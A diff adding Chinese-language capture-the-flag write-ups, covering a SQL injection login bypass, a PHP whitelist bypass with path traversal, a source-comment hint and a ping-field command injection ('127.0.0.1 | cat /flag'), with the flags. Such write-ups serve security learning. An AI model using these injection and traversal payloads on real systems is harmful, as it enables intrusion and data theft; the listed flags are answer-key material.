@@ -872,6 +872,134 @@ if(file_get_contents($_GET['data']) == "Welcome to CTF"){
 
 ------
 
+### [极客大挑战 2019]EasySQL
+
+这题考察点是`SQL`注入，`1' or '1'='1 `拿下`flag{00c8a93c-61fe-4226-a3f6-9f9585dd3544}`。
+
+```
+1' and 1=1#    // NO,Wrong username password！！！
+1' or '1'='1   // Login Success!
+```
+
+------
+
+### [HCTF 2018]WarmUp
+
+打开靶机看到滑稽，`view-source`查看源码发现关键注释<!--source.php-->，`source.php`源码如下：
+
+```php
+<?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&$page)
+        {
+            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];  // 白名单
+            if (! isset($page) || !is_string($page)) {     // 检查$page参数不是空值或者不是字符串
+                echo "you can't see it";
+                return false;
+            }
+
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+			// 获取$page中从0开始到mb_strpos($page . '?', '?')结束的字符串
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')   // 获取$page?中首次查找到'?'字符的位置,返回int类型
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+			// url解码后再截取$page中从0开始到首次出现的?之前的字符串
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
+	// 首先判断file参数是不是空值，再判断file是不是字符串，最后将file传入checkFile类中再进行判断
+    if (! empty($_REQUEST['file'])
+        && is_string($_REQUEST['file'])
+        && emmm::checkFile($_REQUEST['file'])
+    ) {
+        include $_REQUEST['file'];
+        exit;
+    } else {
+        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
+    }  
+?>
+```
+
+访问`hint.php`看到以下信息：
+
+```
+flag not here, and flag in ffffllllaaaagggg
+```
+
+`?file=source.php?../../../../../../ffffllllaaaagggg`得到`flag{2cd377e0-3ff6-439b-bc18-f36c038d3457}`。
+
+------
+
+### [极客大挑战 2019]Havefun
+
+一起来撸猫，`view-source`查看源码发现注释：
+
+```php+HTML
+<!--
+$cat=$_GET['cat'];
+echo $cat;
+if($cat=='dog'){
+	echo 'Syc{cat_cat_cat_cat}';
+}
+-->
+```
+
+`?cat=dog`得到`flag{11b14848-5cda-42e9-bbe2-35b5f0f7f30f}`。
+
+------
+
+### [ACTF2020 新生赛]Exec
+
+尝试输入`127.0.0.1 | ls /`，好家伙！
+
+```
+bin
+dev
+etc
+flag
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+`127.0.0.1 | cat /flag`得到`flag{5e8d40da-4393-4d5a-bd44-5abf8c009e58}`。
+
+------
+
+
+
+------
+
 ## PwnTheBox
 
 ### [XSS](https://ce.pwnthebox.com/challenges?type=5&id=673)
